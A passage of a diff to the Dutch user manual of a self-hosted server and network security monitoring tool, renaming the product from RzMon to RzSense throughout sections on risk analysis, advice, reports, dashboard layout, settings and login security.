-Opent er niets, sta dan pop-ups toe voor RzMon. Het rapport is een losse pagina zonder scripts, en ziet er op papier hetzelfde uit als op het scherm.
+Opent er niets, sta dan pop-ups toe voor RzSense. Het rapport is een losse pagina zonder scripts, en ziet er op papier hetzelfde uit als op het scherm.
 
 ### Aanvalspad en impact 🎯 (vanaf 1.146.0)
 Klik op het **risicogetal** van een server op het dashboard (of op **🎯 Aanvalspad** in een incident). Je ziet:
@@ -390,7 +392,7 @@ Klik op het **risicogetal** van een server op het dashboard (of op **🎯 Aanval
 - de **open incidenten** van die server;
 - de servers die ervan **afhangen** (via *Afhankelijk van*): valt deze server om of wordt hij overgenomen, dan raakt dat ook die servers (*blast radius*).
 
-Het is een schatting: RzMon kent je firewall niet. Een poort die op alle adressen luistert, kan van buiten toch dicht zijn.
+Het is een schatting: RzSense kent je firewall niet. Een poort die op alle adressen luistert, kan van buiten toch dicht zijn.
 
 ### Doelen en "na de actie" 🎯 (vanaf 1.146.0)
 Op **📊 Analyse**, direct na *Wat nu aanpakken*:
@@ -406,7 +408,7 @@ Op **📊 Analyse**, direct na *Wat nu aanpakken*:
 Je meldregels tellen mee: met *melden na 10 minuten* haal je 5 minuten nooit (dat is dan je eigen keuze). Zelf herstellen en stiltes van agents worden bijgehouden vanaf 1.146.0; daarvoor is er nog niets.
 
 ### Analyse en advies 📊 (vanaf 1.155.0)
-Vanaf 1.155.0 draait de pagina **Analyse** om advies: wat kun je veranderen om je netwerk veiliger te maken, en waarom. RzMon combineert daarvoor de gegevens van de agents, de CVE-scan, het IDS, de netwerkscan, de checks en je instellingen. Een advies verschijnt alleen als er bewijs voor is in je eigen gegevens.
+Vanaf 1.155.0 draait de pagina **Analyse** om advies: wat kun je veranderen om je netwerk veiliger te maken, en waarom. RzSense combineert daarvoor de gegevens van de agents, de CVE-scan, het IDS, de netwerkscan, de checks en je instellingen. Een advies verschijnt alleen als er bewijs voor is in je eigen gegevens.
 
 **Bovenaan** de **veiligheidsscore** (0–100) met het verloop (elke nacht bewaard) en een score per onderdeel: 🔑 *Toegang en SSH*, 🌐 *Blootstelling van buiten*, 🐞 *Kwetsbaarheden en updates*, 🛡️ *Detectie en reactie*, 📡 *Netwerk en apparaten* en 💾 *Herstel en monitoring*. Elk onderdeel begint op 100; een open advies kost 18 (hoog), 8 (middel) of 2 (laag) punten. De totaalscore is het gemiddelde. Klik op een onderdeel voor zijn adviezen.
 
@@ -415,9 +417,9 @@ Vanaf 1.155.0 draait de pagina **Analyse** om advies: wat kun je veranderen om j
 - **Waarom (uit je gegevens)**: het bewijs, bijvoorbeeld *"sshd luistert op poort 22 · geïnstalleerd openssh-server 1:9.6p1-3ubuntu13, opgelost in …13.3 · CVE-2024-6387 (CVSS 8,1, kans op misbruik 94%) · poort 22 is 617 keer van buiten aangevallen · 3 servers hangen af van deze server"*;
 - **Wat te doen**, met de commando's voor die server (apt, dnf of apk) en een knop **Kopiëren**;
 - voor beheerders een knop om het meteen te regelen: **bijwerken via de agent**, **blokkeren**, het **IDS op Blokkeren**, **gedeelde blokkades aan** of een **langere blokkade bij herhaling**. Altijd met een bevestiging; een instelling komt in het wijzigingslogboek;
-- **Ik heb het gedaan**, **Later (7 dagen)** of **Niet van toepassing** (telt dan niet meer mee in de score). Dit geldt voor iedereen; RzMon onthoudt wie het aangaf. *Gedaan* blijft zichtbaar tot RzMon zelf ziet dat het is opgelost; dan staat het onder **Opgelost in de laatste 30 dagen**. Komt het later terug, dan is het weer open.
+- **Ik heb het gedaan**, **Later (7 dagen)** of **Niet van toepassing** (telt dan niet meer mee in de score). Dit geldt voor iedereen; RzSense onthoudt wie het aangaf. *Gedaan* blijft zichtbaar tot RzSense zelf ziet dat het is opgelost; dan staat het onder **Opgelost in de laatste 30 dagen**. Komt het later terug, dan is het weer open.
 
-**Wat RzMon zelf herkent** (elke 15 minuten opnieuw berekend):
+**Wat RzSense zelf herkent** (elke 15 minuten opnieuw berekend):
 
 | Analyse | Combineert |
 |---|---|
@@ -429,13 +431,13 @@ Vanaf 1.155.0 draait de pagina **Analyse** om advies: wat kun je veranderen om j
 | **Van buiten bereikbaar** | SSH, RDP, SMB, databases, Proxmox … die van buiten worden aangevallen, met landen en aandeel |
 | **Verdachte login** | een SSH-login uit een land buiten je toegestane landen, met een wachtwoord, of vlak na een brute-force-aanval uit hetzelfde netwerk |
 | **IDS** | IDS uit of op Leren, gedeelde blokkades uit terwijl aanvallers meerdere servers proberen, aanvallers die terugkomen na hun blokkade |
-| **Nieuwe open poort** | een poort op een server of netwerkapparaat die er de afgelopen dagen bij kwam (de eerste twee dagen leert RzMon wat er al open staat) |
+| **Nieuwe open poort** | een poort op een server of netwerkapparaat die er de afgelopen dagen bij kwam (de eerste twee dagen leert RzSense wat er al open staat) |
 | **Apparaat belt naar buiten** | verbindingen naar bekende aanvallers; bij een camera of slim apparaat het advies voor een apart netwerk (VLAN) |
 | **Netwerkapparaten** | riskante poorten (telnet, SMB …) en nog niet beoordeelde apparaten |
 | **Verouderde software zonder agent** | wat een dienst bij de netwerkscan over zichzelf vertelt (bijvoorbeeld `SSH-2.0-OpenSSH_7.4` of `Server: Boa/0.94`), vergeleken met veilige versies |
 | **Niet bewaakt** | webdiensten die worden aangevallen zonder SSL-check, servers zonder diskcheck |
-| **Agents en RzMon** | stille of oude agents, beheerders zonder tweestapsverificatie |
-| **Herstel** | disks die vollopen, guests zonder back-up, mislukte heartbeats, geen back-up van RzMon, checks met vals alarm |
+| **Agents en RzSense** | stille of oude agents, beheerders zonder tweestapsverificatie |
+| **Herstel** | disks die vollopen, guests zonder back-up, mislukte heartbeats, geen back-up van RzSense, checks met vals alarm |
 | **Trend** | flink meer aanvallen dan de week ervoor |
 
 **Melding**: een advies over een kwetsbaarheid die **wereldwijd bekend en kritiek** is, krijg je ook via je kanalen (Pushover, e-mail …). Dat geldt voor een CVE die actief misbruikt wordt (CISA KEV), of een CVE met CVSS 9 of hoger en een kans op misbruik (EPSS) van 50% of meer, alleen als er een update is en als die een server van jou raakt. Je krijgt de melding één keer per advies. Aan of uit bij *Meldingen → Systeemmeldingen → Kritiek advies*.
@@ -452,17 +454,17 @@ Het tabblad **📊 Analyse** laat zien hoe het over langere tijd gaat, en wat je
 
 - **Periode** bovenaan: *24 uur, 7 dagen, 30 dagen, 90 dagen, 365 dagen* of eigen datums (*Van* / *Tot en met* → **Toon**). De keuze wordt per apparaat onthouden. Elk cijfer wordt vergeleken met de **periode ervoor van dezelfde lengte** (▲/▼); is er van die periode nog niets bekend, dan staat er *geen vorige periode*.
 - **Kerncijfers**: beschikbaarheid, storingen (een check die naar critical ging), gemiddelde hersteltijd, meldingen, IDS-incidenten (critical) en een **score** (100 min de punten voor wat er in *Wat nu aanpakken* staat: veel voor rood, minder voor oranje).
-- **🎯 Wat nu aanpakken** (tot 1.155.0; nu de adviezen hierboven): een lijst met concrete punten, de belangrijkste eerst. Bijvoorbeeld een disk die binnen 30 dagen vol is (of al 90%), een Proxmox-guest zonder (recente) back-up of in geen enkele back-uptaak, een check die steeds wisselt, een server onder 99% bereikbaar, een apparaat met een riskante poort open, nieuwe apparaten die je nog niet beoordeeld hebt, kwetsbaarheden waarvoor een update is, een lage hardening-score, open IDS-incidenten, een heartbeat die te laat is, en een oude back-up van RzMon zelf. Klik op een punt en RzMon springt naar de plek waar je het oplost.
+- **🎯 Wat nu aanpakken** (tot 1.155.0; nu de adviezen hierboven): een lijst met concrete punten, de belangrijkste eerst. Bijvoorbeeld een disk die binnen 30 dagen vol is (of al 90%), een Proxmox-guest zonder (recente) back-up of in geen enkele back-uptaak, een check die steeds wisselt, een server onder 99% bereikbaar, een apparaat met een riskante poort open, nieuwe apparaten die je nog niet beoordeeld hebt, kwetsbaarheden waarvoor een update is, een lage hardening-score, open IDS-incidenten, een heartbeat die te laat is, en een oude back-up van RzSense zelf. Klik op een punt en RzSense springt naar de plek waar je het oplost.
 - **Betrouwbaarheid**: beschikbaarheid per dag en per server (de slechtste bovenaan, met hoeveel minuten onbereikbaar), **wanneer het misgaat** (storingen per weekdag en uur: een donker vakje dat steeds terugkomt wijst op iets geplands), de lastigste checks, responstijden en herstarts.
 - **Capaciteit**: wanneer disks vol zijn, CPU en RAM per server (gemiddeld en piek), de grootste Proxmox-guests en de groei van het aantal servers en checks.
 - **Beveiliging**: mislukte logins, IDS-incidenten en blokkades per dag, waar aanvallen vandaan komen, de meest actieve IP's en meest aangevallen servers, logins op je servers (van buiten, 's nachts), kwetsbaarheden en de hardening-score per server.
 - **Netwerk** (als de netwerkscan aan staat): soorten apparaten, fabrikanten, nieuwe apparaten per dag, wifi-clients per access point en per netwerk (UniFi) en de DNS-statistiek van AdGuard Home.
-- **Back-ups**: de laatste back-up per Proxmox-guest, de back-uptaken, je heartbeats en de back-up van RzMon zelf.
+- **Back-ups**: de laatste back-up per Proxmox-guest, de back-uptaken, je heartbeats en de back-up van RzSense zelf.
 - **Meldingen en ruis**: meldingen per dag en per kanaal, de checks met de meeste meldingen, en checks die steeds **binnen 5 minuten vanzelf herstelden**. Zet daar *melden na N fouten* op 3 en je krijgt minder ruis.
 
-Beweeg over een grafiek voor de precieze waarde. RzMon houdt hiervoor elk uur **dagtotalen** bij (tabel `stats_daily`) en bewaart die **een jaar**, ook als de losse meetwaarden al opgeruimd zijn. Bij de eerste keer rekent RzMon alles uit wat er nog aan meetwaarden is. Sommige cijfers (aantal checks, open kwetsbaarheden) worden pas vanaf 1.106.0 bijgehouden.
+Beweeg over een grafiek voor de precieze waarde. RzSense houdt hiervoor elk uur **dagtotalen** bij (tabel `stats_daily`) en bewaart die **een jaar**, ook als de losse meetwaarden al opgeruimd zijn. Bij de eerste keer rekent RzSense alles uit wat er nog aan meetwaarden is. Sommige cijfers (aantal checks, open kwetsbaarheden) worden pas vanaf 1.106.0 bijgehouden.
 
-**Rapporten** (vanaf 1.180.0): alle overzichten die RzMon per e-mail of push verstuurt, stel je in bij **Instellingen → Rapporten**. Op Analyse staat daarvoor de knop **📬 Rapporten**.
+**Rapporten** (vanaf 1.180.0): alle overzichten die RzSense per e-mail of push verstuurt, stel je in bij **Instellingen → Rapporten**. Op Analyse staat daarvoor de knop **📬 Rapporten**.
 
 | Rapport | Wat erin staat | Standaard |
 |---|---|---|
@@ -493,8 +495,8 @@ Beweeg over een grafiek voor de precieze waarde. RzMon houdt hiervoor elk uur **
 - **Over het AI-weekoverzicht:** de AI maakt het op de gekozen dag en tijd, en zodra het klaar is wordt het verstuurd.
 
 ### Live bijwerken ⚡ en Zoeken en doen ⌨️ (vanaf 1.107.0)
-- **Live bijwerken**: RzMon kijkt elke paar seconden of er iets veranderd is (een storing, een melding, iets bevestigd of in onderhoud, een nieuwe checkronde) en werkt dan meteen het scherm bij. Het groene bolletje bij *Laatste check* laat zien dat het werkt (grijs = even geen verbinding). Het is licht voor de server: er blijven geen verbindingen openstaan.
-- **Echt live** (vanaf 1.109.0): RzMon bouwt het scherm niet meer opnieuw op, maar past **alleen aan wat veranderde**. Wat je openklapte (een server, een dag bij Meldingen, *Verbindingscontrole* in de Agent Manager), een menu, wat je typt en je scrollpositie blijven gewoon staan. Dat geldt op elke pagina: Dashboard, Meldingen, IDS, Kwetsbaarheden en Netwerk.
+- **Live bijwerken**: RzSense kijkt elke paar seconden of er iets veranderd is (een storing, een melding, iets bevestigd of in onderhoud, een nieuwe checkronde) en werkt dan meteen het scherm bij. Het groene bolletje bij *Laatste check* laat zien dat het werkt (grijs = even geen verbinding). Het is licht voor de server: er blijven geen verbindingen openstaan.
+- **Echt live** (vanaf 1.109.0): RzSense bouwt het scherm niet meer opnieuw op, maar past **alleen aan wat veranderde**. Wat je openklapte (een server, een dag bij Meldingen, *Verbindingscontrole* in de Agent Manager), een menu, wat je typt en je scrollpositie blijven gewoon staan. Dat geldt op elke pagina: Dashboard, Meldingen, IDS, Kwetsbaarheden en Netwerk.
   - Ook **nieuwe meetwaarden** komen meteen binnen: een waarde die verandert, **licht even op** en **telt** naar de nieuwe waarde (bv. CPU 23% → 41%). Een check die van status wisselt, kleurt even mee.
   - *"Laatste check 12 s geleden"* telt gewoon door.
   - Een **nieuw probleem** (er ging echt een melding uit, dus na *melden na N*) geeft een klein **meldinkje rechtsonder**: *"🔴 NAS – SMB: CRITICAL"*. Klik erop en de check opent. Bij meer dan 3 tegelijk één meldinkje.
@@ -509,9 +511,9 @@ Beweeg over een grafiek voor de precieze waarde. RzMon houdt hiervoor elk uur **
 
 ### Soort apparaat: servers en netwerk apart (vanaf 1.75.0)
 Elke server heeft een **soort apparaat**: 🖥️ server, 🌐 router, 🔀 switch, 📶 access point, 🧱 firewall, 🗄️ NAS, 🔋 UPS, 📷 camera (vanaf 1.76.0), 🏠 smart home, 🖨️ printer of 📦 overig. Op het dashboard vallen ze in groepen: **🖥️ Servers · 🌐 Netwerk** (router, switch, access point, firewall) **· 🗄️ Opslag · 🔋 Stroom · 📷 Camera's · 🏠 Smart home · 📦 Overig**.
-- **Vanzelf herkend:** een agent is een server, de Home Assistant-add-on smart home; met SNMP kijkt RzMon naar het apparaat zelf (UniFi = access point, Synology/QNAP/TrueNAS = NAS, UPS-MIB of APC = UPS, printer-MIB = printer, MikroTik = router, merken als Cisco, Netgear, TP-Link of HP = switch, pfSense/OPNsense/Fortinet = firewall, Linux/Proxmox/Windows = server). Dat gebeurt bij *🔍 Test SNMP*, bij *📡 SNMP-checks* en anders bij de eerste SNMP-check. Zonder agent of SNMP is het *overig*.
+- **Vanzelf herkend:** een agent is een server, de Home Assistant-add-on smart home; met SNMP kijkt RzSense naar het apparaat zelf (UniFi = access point, Synology/QNAP/TrueNAS = NAS, UPS-MIB of APC = UPS, printer-MIB = printer, MikroTik = router, merken als Cisco, Netgear, TP-Link of HP = switch, pfSense/OPNsense/Fortinet = firewall, Linux/Proxmox/Windows = server). Dat gebeurt bij *🔍 Test SNMP*, bij *📡 SNMP-checks* en anders bij de eerste SNMP-check. Zonder agent of SNMP is het *overig*.
 - **📷 Camera's** (vanaf 1.76.0): herkend via SNMP (Axis, Hikvision, Dahua, Hanwha, of *camera*/*NVR* in de beschrijving), en zonder SNMP aan de **naam**: bevat die *cam*, *camera*, *IPCam*, *CCTV* of *deurbel* (bv. *Cam voordeur*, *IPCam2*), dan is het vanzelf een camera. Bij een camera staat de knop **＋ Aanbevolen checks**: ping, **RTSP (poort 554)** voor de videostroom, en eventueel de webpagina (poort 80 of 443). Een NVR (UniFi Protect, Synology Surveillance, Frigate) zet je zelf op *Server* of *NAS*.
-- **Zelf kiezen:** *✎ Bewerken → Soort apparaat*. *Vanzelf* toont wat RzMon herkent; een keuze gaat daar altijd voor.
+- **Zelf kiezen:** *✎ Bewerken → Soort apparaat*. *Vanzelf* toont wat RzSense herkent; een keuze gaat daar altijd voor.
 - **Dashboard bij *Alle*** (en *Problemen*, *Onderhoud*): een **blok per groep**, elk met *Met problemen* en *Alles in orde*.
 - **Eén groep gekozen:** alleen die apparaten, en ook de **tellers, tegels en *Nu aandacht nodig*** tellen alleen die groep (*Apparaten bereikbaar*, *Checks OK*, *Open problemen*, *Beschikbaar 24 u*).
 - De chips *Agent · Home Assistant · Remote · Lokaal* zijn vervangen door de groepen; *Agent*, *Remote* en dergelijke vind je bij *⚲ Filters → Bewaking*. Bij *⚲ Filters* staat ook **Soort apparaat**, ook bij Meldingen en IDS.
@@ -540,13 +542,13 @@ Elke server heeft een **soort apparaat**: 🖥️ server, 🌐 router, 🔀 swit
 - **Alles dicht** (standaard): servers, dagen, gebundelde regels en adressen staan dicht; je ziet de koppen met hun tellers en bolletjes. Wat je openklapt, blijft open tot je herlaadt. Met **zoeken of een filter** gaan de servers en dagen met treffers vanzelf open.
 - **Vandaag staat altijd open** (vanaf 1.78.0) op *Meldingen*, *IDS → Incidenten* en *IDS → Logins*, de andere dagen zijn dicht. Klap je vandaag dicht en komt er iets nieuws bij, dan gaat hij vanzelf weer open. Is er vandaag nog niets, dan staat er bovenaan een lege balk *Vandaag · geen meldingen 👌*.
 - **Slim openen**: zoals het vóór 1.71.0 werkte (vandaag open, opengeklapte servers onthouden in deze browser).
-- **Kwetsbaarheden en Datalekken** (vanaf 1.93.0): altijd dicht, behalve wat **jij** open had. Wat je open- of dichtklapt (ook met *Alles openen / sluiten*) onthoudt RzMon **per account**, dus ook op je telefoon; zonder account (LAN zonder wachtwoord) in deze browser. *Slim openen* telt hier niet mee. Met zoeken of een filter gaan de blokken met treffers tijdelijk open; wis je de zoekopdracht, dan staat alles weer zoals jij het had.
+- **Kwetsbaarheden en Datalekken** (vanaf 1.93.0): altijd dicht, behalve wat **jij** open had. Wat je open- of dichtklapt (ook met *Alles openen / sluiten*) onthoudt RzSense **per account**, dus ook op je telefoon; zonder account (LAN zonder wachtwoord) in deze browser. *Slim openen* telt hier niet mee. Met zoeken of een filter gaan de blokken met treffers tijdelijk open; wis je de zoekopdracht, dan staat alles weer zoals jij het had.
 - Overal staat in het menu **⋯** *Alles openen / sluiten*.
 
 ### Logo en icoon (vanaf 1.73.0)
-- Het logo van RzMon staat in de bovenbalk en op het inlogscherm; in het donkere thema worden de letters vanzelf wit.
+- Het logo van RzSense staat in de bovenbalk en op het inlogscherm; in het donkere thema worden de letters vanzelf wit.
 - Het **tabblad** in de browser toont het icoon (oranje schild met de z).
-- **Op je telefoon vastzetten:** iPhone: Safari → *Deel* → *Zet op beginscherm*; Android: Chrome → ⋮ → *Toevoegen aan startscherm*. RzMon opent dan als losse app met zijn eigen icoon.
+- **Op je telefoon vastzetten:** iPhone: Safari → *Deel* → *Zet op beginscherm*; Android: Chrome → ⋮ → *Toevoegen aan startscherm*. RzSense opent dan als losse app met zijn eigen icoon.
 - **Pushover:** zet [`brand/pushover-icon-72.png`](brand/pushover-icon-72.png) als icoon van je applicatie op pushover.net (zie *Pushover instellen*).
 - De HA-add-on heeft hetzelfde icoon in de add-on winkel.
 - **Blox en L1nes** blijven, per apparaat te kiezen onder *Mijn account → Weergave*. Blox: kaarten (Large met mini-grafiekjes, Small compacter) en de compacte lijst voor servers zonder problemen. L1nes: rijen, ook gesplitst in *Servers met problemen* en *Alles in orde*.
@@ -556,7 +558,7 @@ Elke server heeft een **soort apparaat**: 🖥️ server, 🌐 router, 🔀 swit
 - **Minigrafiek per check** van de laatste 24 uur; klik erop voor de grote **grafiek** over 6 uur tot 30 dagen, met beschikbaarheid, minimum, gemiddelde, maximum en bij disks de trend.
 - **Beschikbaarheid per server** over 24 uur, 7 dagen en 30 dagen.
 - **Tabbladen** (vanaf 1.63.0): Dashboard, Meldingen, IDS en Kwetsbaarheden staan in één balk midden in de bovenbalk, elk met een icoon; het actieve tabblad heeft een licht vlak met een gekleurde streep, dat meeschuift als je wisselt. De bovenbalk blijft staan als je scrolt. Op de telefoon (smaller dan 720 px) staan de tabbladen in een **balk onderaan het scherm**, onder je duim; *Kwetsbaarheden* heet daar *CVE's*. Een teller staat als bolletje op het icoon en **pulseert kort** als het aantal omhooggaat.
-- **Tellers op de tabbladen:** achter **Dashboard** staat het aantal **nieuwe problemen** sinds je het dashboard voor het laatst zag: checks die sindsdien warning, critical of onbekend werden en dat nog zijn (geen info-checks, onderhoud of bevestigde problemen). De kleur volgt het ergste: rood, oranje of grijs. Achter **Meldingen** staat het aantal **nieuwe meldingen** sinds je die pagina voor het laatst opende (warning, critical, onbekend, hersteld en IDS; geen info en geen bevestigingen). Open je het tabblad, dan gaat de teller naar 0. Dit wordt **per gebruiker** onthouden, dus ook op je andere apparaten. Het totaal staat ook in de titel van het browsertabblad, bijvoorbeeld *(3) RzMon*.
+- **Tellers op de tabbladen:** achter **Dashboard** staat het aantal **nieuwe problemen** sinds je het dashboard voor het laatst zag: checks die sindsdien warning, critical of onbekend werden en dat nog zijn (geen info-checks, onderhoud of bevestigde problemen). De kleur volgt het ergste: rood, oranje of grijs. Achter **Meldingen** staat het aantal **nieuwe meldingen** sinds je die pagina voor het laatst opende (warning, critical, onbekend, hersteld en IDS; geen info en geen bevestigingen). Open je het tabblad, dan gaat de teller naar 0. Dit wordt **per gebruiker** onthouden, dus ook op je andere apparaten. Het totaal staat ook in de titel van het browsertabblad, bijvoorbeeld *(3) RzSense*.
 - **Bijwerken:** de pagina ververst zichzelf elke 20 seconden. Met **↻ Alles nu checken** draai je direct alle checks.
 - **Weergave:** donker en licht thema, werkt ook op je telefoon.
 - **Twee lay-outs** (*👤 Mijn account → Weergave op dit apparaat*, per apparaat):
@@ -574,12 +576,12 @@ Elke server heeft een **soort apparaat**: 🖥️ server, 🌐 router, 🔀 swit
   - De lay-out geldt ook voor **Meldingen**: in L1nes een tabel met één regel per melding (tijd, status, server, check, bericht en kanalen; **Small:** het bericht ingekort, klik erop voor het hele bericht; **Large:** het hele bericht). In **Blox Small** één regel per melding (op de telefoon twee); **Large:** zoals altijd. De instellingen hebben sinds 1.60.0 een eigen, vaste opmaak (zie hieronder).
 
 ### Accountmenu, Mijn account en Instellingen (vanaf 1.60.0)
-**Zijbalk** (vanaf 1.135.0): op een breed scherm staat het menu links onder elkaar (Dashboard, Monitoring, Meldingen, IDS, Kwetsbaarheden, Analyse, Netwerk), met onderaan **Instellingen** (beheerders), zoeken (Ctrl+K) en je account. Op een smaller scherm staan de tabbladen bovenaan, op de telefoon in de balk onderaan. Met **« Inklappen** onderaan (vanaf 1.150.0) wordt de zijbalk smal: alleen de iconen, met de tellers erbij en de naam als je een icoon aanwijst; **» Uitklappen** maakt hem weer breed. RzMon onthoudt dat per gebruiker (op elk apparaat). Het accountmenu (je naam onderaan) zweeft boven de pagina en past altijd helemaal.
+**Zijbalk** (vanaf 1.135.0): op een breed scherm staat het menu links onder elkaar (Dashboard, Monitoring, Meldingen, IDS, Kwetsbaarheden, Analyse, Netwerk), met onderaan **Instellingen** (beheerders), zoeken (Ctrl+K) en je account. Op een smaller scherm staan de tabbladen bovenaan, op de telefoon in de balk onderaan. Met **« Inklappen** onderaan (vanaf 1.150.0) wordt de zijbalk smal: alleen de iconen, met de tellers erbij en de naam als je een icoon aanwijst; **» Uitklappen** maakt hem weer breed. RzSense onthoudt dat per gebruiker (op elk apparaat). Het accountmenu (je naam onderaan) zweeft boven de pagina en past altijd helemaal.
 
-**Breedte van de zijbalk** (vanaf 1.167.0): sleep de rechterrand van de zijbalk naar links of rechts (tussen 180 en 380 pixels). **Dubbelklik** op de rand zet hem terug op de standaard. Met het toetsenbord: zet de focus op de rand en gebruik ← en →, *Home* = standaard. RzMon onthoudt de breedte voor je account.
+**Breedte van de zijbalk** (vanaf 1.167.0): sleep de rechterrand van de zijbalk naar links of rechts (tussen 180 en 380 pixels). **Dubbelklik** op de rand zet hem terug op de standaard. Met het toetsenbord: zet de focus op de rand en gebruik ← en →, *Home* = standaard. RzSense onthoudt de breedte voor je account.
 
 **Beheermenu in de zijbalk** (vanaf 1.167.0): ga je naar **Instellingen** of **Mijn account**, dan wordt de zijbalk het menu van die pagina:
-- bovenaan **← Terug naar RzMon**: terug naar de pagina waar je vandaan kwam;
+- bovenaan **← Terug naar RzSense**: terug naar de pagina waar je vandaan kwam;
 - bij Instellingen: het zoekveld en alle onderdelen (Overzicht, Monitoring, Meldingen, IDS, Beveiliging, Agents, Koppelingen, Systeem), met de bolletjes voor wat aandacht nodig heeft; de pagina zelf wordt daardoor breder;
 - bij Mijn account: de onderdelen van je account (Gegevens, Wachtwoord, Tweestapsverificatie, Van buiten en passkeys, Ingelogde apparaten, Mijn laatste logins, Weergave); klik en je springt ernaartoe.
 Is de zijbalk ingeklapt tot iconen, of is het scherm smaller, dan blijft het zoals eerder (het menu van de instellingen staat dan op de pagina zelf).
@@ -596,10 +598,10 @@ Is de zijbalk ingeklapt tot iconen, of is het scherm smaller, dan blijft het zoa
   - **🔐 Toegang**: Inloggen · Van buiten (https, onzichtbaar van buiten, apparaten en passkeys) · Gebruikers;
   - **🖥️ Agents**: Agents (één tabel met alle agents, bijwerken, ritme, laatste en volgende contact) · Beveiligde verbinding · Commando-checks;
   - **🔗 Koppelingen**: MQTT (Home Assistant) · REST API en API-sleutels;
-  - **🛠️ Systeem**: RzMon bijwerken · Back-up · Database en opslag · Server en PHP · Systeemcheck · Wijzigingslogboek · Exporteren en importeren.
+  - **🛠️ Systeem**: RzSense bijwerken · Back-up · Database en opslag · Server en PHP · Systeemcheck · Wijzigingslogboek · Exporteren en importeren.
 
-  Je ziet één onderdeel tegelijk; elk heeft een eigen adres (bv. `#settings/backup`) en RzMon onthoudt waar je was. Op de telefoon is de zijbalk een keuzelijst bovenaan. **Blokkades en de whitelist** staan in het tabblad **IDS → ⛔ Blokkades**.
-  - **✅ Hoe staat het ervoor?** (vanaf 1.62.0) is het eerste onderdeel; via het accountmenu kom je altijd hier. Een cirkel met een score (0–100%) en een lijst: ✔ groen is in orde, **!** oranje is een aandachtspunt, ✘ rood moet je regelen, grijs is optioneel (telt niet mee). RzMon kijkt naar: een **meldkanaal** (Pushover of e-mail aan en ingevuld), **automatische back-up** (en de laatste niet ouder dan een week), **2FA** voor alle beheerders (accounts die *alleen lokaal* mogen inloggen tellen niet mee), **inlogbeveiliging**, een **nieuwe RzMon-versie**, **agents** op een oudere versie of **onversleuteld**, **HTTPS** (zoals jij RzMon nu opent), en of **kwetsbaarheden** en **IDS** aan staan. Klik op een punt en je staat bij de instelling. In de zijbalk krijgt een groep met een aandachtspunt een oranje (of rood) bolletje. Open je zo'n onderdeel, dan staat bovenaan de pagina een oranje (of rode) balk **Aandacht nodig** (vanaf 1.133.0) met elk punt: wat er mis is, en waar dat kan meteen de knop of de opdracht om het op te lossen. Vanaf 1.148.0 staat er ook een 🟠/🔴 bolletje bij de **titel van de kaart** waar het punt over gaat, en brengt een klik op het punt in de balk je naar die kaart. Is het opgelost, dan verdwijnen de balk en het bolletje vanzelf.
+  Je ziet één onderdeel tegelijk; elk heeft een eigen adres (bv. `#settings/backup`) en RzSense onthoudt waar je was. Op de telefoon is de zijbalk een keuzelijst bovenaan. **Blokkades en de whitelist** staan in het tabblad **IDS → ⛔ Blokkades**.
+  - **✅ Hoe staat het ervoor?** (vanaf 1.62.0) is het eerste onderdeel; via het accountmenu kom je altijd hier. Een cirkel met een score (0–100%) en een lijst: ✔ groen is in orde, **!** oranje is een aandachtspunt, ✘ rood moet je regelen, grijs is optioneel (telt niet mee). RzSense kijkt naar: een **meldkanaal** (Pushover of e-mail aan en ingevuld), **automatische back-up** (en de laatste niet ouder dan een week), **2FA** voor alle beheerders (accounts die *alleen lokaal* mogen inloggen tellen niet mee), **inlogbeveiliging**, een **nieuwe RzSense-versie**, **agents** op een oudere versie of **onversleuteld**, **HTTPS** (zoals jij RzSense nu opent), en of **kwetsbaarheden** en **IDS** aan staan. Klik op een punt en je staat bij de instelling. In de zijbalk krijgt een groep met een aandachtspunt een oranje (of rood) bolletje. Open je zo'n onderdeel, dan staat bovenaan de pagina een oranje (of rode) balk **Aandacht nodig** (vanaf 1.133.0) met elk punt: wat er mis is, en waar dat kan meteen de knop of de opdracht om het op te lossen. Vanaf 1.148.0 staat er ook een 🟠/🔴 bolletje bij de **titel van de kaart** waar het punt over gaat, en brengt een klik op het punt in de balk je naar die kaart. Is het opgelost, dan verdwijnen de balk en het bolletje vanzelf.
   - **🔍 Zoek een instelling…** bovenaan de zijbalk (op de telefoon boven de keuzelijst) zoekt in de namen van de onderdelen én in alle velden, schakelaars en koppen, ook ingeklapte. Met **Enter** (of een klik op een resultaat) spring je naar het veld: het licht even op en een ingeklapt *Geavanceerd* gaat open. **Esc** wist de zoekterm.
   - Uitleg is één regel met **Meer info** om alles te lezen (vanaf 1.161.0). Een lange toelichting bij een veld is een **ⓘ**: wijs hem aan (of tik erop) voor de tooltip.
   - Zelden gebruikte opties staan ingeklapt onder **▸ Geavanceerd**: bij Pushover de prioriteiten en het geluid, bij Alarmgedrag het logvenster en automatisch onderhoud, bij E-mail het SSL-certificaat controleren, bij MQTT de topics en het TLS-certificaat, en bij Toegang de reverse proxy.
@@ -613,15 +615,15 @@ Is de zijbalk ingeklapt tot iconen, of is het scherm smaller, dan blijft het zoa
 - **Agent-servers:** daar zie je ook welke poorten luisteren, met procesnaam. Dat werkt ook voor poorten achter een firewall.
 
 ### Toegang en beveiliging
-- **Login:** inloggen met gebruikersnaam en wachtwoord. Pogingen worden afgeremd tegen brute force. Wachtwoorden worden opgeslagen met **Argon2id** (vanaf 1.143.0; bcrypt als PHP geen Argon2id heeft). Oude (bcrypt-)wachtwoorden blijven gewoon werken: bij je eerstvolgende login zet RzMon ze **ongemerkt** om. Je hoeft niets te doen.
-- **Beveiligingsheaders** (vanaf 1.143.0): elke pagina krijgt een **Content-Security-Policy**. Alleen de eigen scripts van RzMon mogen draaien (de paar ingebouwde scripts met een sleutel die per keer verschilt), geen plug-ins, en formulieren gaan alleen naar RzMon. Zo kan een ingeslopen stukje HTML (bv. in een checkbericht) geen script uitvoeren. Daarnaast *nosniff*, een zuinige *Referrer-Policy*, en geen toegang tot camera, microfoon of locatie.
-  - **Insluiten in Home Assistant** (paneel of webpagina-kaart) blijft werken. Wil je dat alleen jouw eigen sites RzMon mogen insluiten, zet dan in `config.php`: `'frame_ancestors' => "'self' https://ha.voorbeeld.nl",` (alleen `'self'` = nergens anders).
+- **Login:** inloggen met gebruikersnaam en wachtwoord. Pogingen worden afgeremd tegen brute force. Wachtwoorden worden opgeslagen met **Argon2id** (vanaf 1.143.0; bcrypt als PHP geen Argon2id heeft). Oude (bcrypt-)wachtwoorden blijven gewoon werken: bij je eerstvolgende login zet RzSense ze **ongemerkt** om. Je hoeft niets te doen.
